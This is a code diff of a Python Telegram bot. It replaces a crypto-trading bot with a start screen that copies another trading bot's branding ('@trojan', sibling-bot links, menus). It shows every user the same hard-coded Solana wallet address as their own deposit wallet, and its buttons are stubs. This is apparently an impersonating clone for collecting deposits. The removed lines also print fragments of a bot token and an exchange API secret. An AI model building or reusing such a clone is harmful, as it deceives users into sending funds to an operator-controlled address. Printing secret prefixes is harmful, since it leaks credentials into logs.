@@ -1,76 +1,54 @@
-import os
-from dotenv import load_dotenv
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
 
-# Load .env file
-load_dotenv()
-
-# Example: access your environment variables
-telegram_token = os.getenv("TELEGRAM_BOT_TOKEN")
-coinbase_secret = os.getenv("COINBASE_API_SECRET")
-
-print("Bot token loaded:", telegram_token[:10], "...")
-print("Coinbase secret starts with:", coinbase_secret[:20])
-
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-
-"""
-Crypto Trading Telegram Bot
-A bot for cryptocurrency trading and meme coin sniping that integrates with BTCC and Coinbase.
-"""
-
-import os
-import sys
-import logging
-import json
-from typing import Dict, Optional, List, Any, Union, Tuple
-from datetime import datetime
-import threading
-
-# Load environment variables
-from dotenv import load_dotenv
-load_dotenv()
-
-BTCC_API_KEY = os.getenv("BTCC_API_KEY")
-BTCC_API_SECRET = os.getenv("BTCC_API_SECRET")
-
-# Set up Python path for imports
-sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
-
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
-from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler, ConversationHandler
-
-# Import utility modules
-from utils.logger import setup_logger
-from utils.price_alerts import PriceAlert, PriceAlertManager
-from utils.strategies import Strategy, StrategyManager, TradingSignal, StrategyType
-from utils.strategies import SMAStrategy, EMAStrategy, RSIStrategy, BollingerBandsStrategy
-from utils.scheduler import TaskScheduler
-from utils.keyboards import KeyboardFactory
-from utils.meme_sniper import MemeToken, MemeSniperAlert, MemeSniper
-from config import config
-from exchanges.btcc import BTCCExchange
-from exchanges.coinbase import CoinbaseExchange
-from exchanges.futures_btcc import BTCCFuturesExchange
-from exchanges.photon_sol import PhotonSOLExchange
-
-# Set up logging
-logger = setup_logger("bot")
-
-# Get the bot token from environment variables
-BOT_TOKEN = config.TELEGRAM_BOT_TOKEN
-if not BOT_TOKEN:
-    logger.error("No bot token found. Please set the TELEGRAM_BOT_TOKEN environment variable.")
-    sys.exit(1)
-
-# ====== Start Bot ======
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("👋 Welcome to Crypto Bot! Ready to snipe some coins?")
+    wallet_address = "3AzjTLSPwmf3sTVYg7BU36VmspKtHEJUYd7CKY5Hix9j"
+    balance_text = (
+        f"Solana -\n`{wallet_address}`\n(Tap to copy)\n"
+        f"Balance: 0 SOL ($0.00)\n"
+        f"\u2014\nClick on the Refresh button to update your current balance.\n\n"
+        f"Join our Telegram group @trojan and follow us on [Twitter](https://twitter.com)!\n\n"
+        f"💡 If you aren't already, we advise that you *use any of the following bots to trade with*. \
+You will have the same wallets and settings across all bots, but it will be significantly faster due to lighter user load.\n"
+        f"[Agamemnon](https://t.me/AgamemnonBot) | [Achilles](https://t.me/AchillesBot) | [Nestor](https://t.me/NestorBot) | [Odysseus](https://t.me/OdysseusBot)\n"
+        f"[Menelaus](https://t.me/MenelausBot) | [Diomedes](https://t.me/DiomedesBot) | [Paris](https://t.me/ParisBot) | [Helenus](https://t.me/HelenusBot) | [Hector](https://t.me/HectorBot)\n\n"
+        f"⚠️ We have no control over ads shown by Telegram in this bot. Do not be scammed by fake airdrops or login pages."
+    )
+
+    buttons = [
+        [InlineKeyboardButton("Buy", callback_data="buy"), InlineKeyboardButton("Sell", callback_data="sell")],
+        [InlineKeyboardButton("Positions", callback_data="positions"), InlineKeyboardButton("Limit Orders", callback_data="limit_orders")],
+        [InlineKeyboardButton("Copy Trade", callback_data="copy_trade"), InlineKeyboardButton("Sniper 🆒", callback_data="sniper")],
+        [InlineKeyboardButton("Trenches", callback_data="trenches"), InlineKeyboardButton("💰 Referrals", callback_data="referrals"), InlineKeyboardButton("⭐ Watchlist", callback_data="watchlist")],
+        [InlineKeyboardButton("Withdraw", callback_data="withdraw"), InlineKeyboardButton("Settings", callback_data="settings")],
+        [InlineKeyboardButton("🔄 Refresh", callback_data="refresh")],
+    ]
+
+    keyboard = InlineKeyboardMarkup(buttons)
+
+    await update.message.reply_text(
+        balance_text,
+        reply_markup=keyboard,
+        parse_mode="Markdown"
+    )
+
+async def handle_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+
+    action = query.data
+    if action == "refresh":
+        await query.edit_message_text("🔄 Refreshing balance...")
+    else:
+        await query.edit_message_text(f"You selected: {action}")
 
 if __name__ == "__main__":
-    application = Application.builder().token(BOT_TOKEN).build()
+    from config import config
 
-    application.add_handler(CommandHandler("start", start))
+    app = Application.builder().token(config.TELEGRAM_BOT_TOKEN).build()
 
-    logger.info("Bot is now polling Telegram for messages...")
-    application.run_polling()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CallbackQueryHandler(handle_button))
+
+    print("Bot is polling...")
+    app.run_polling()
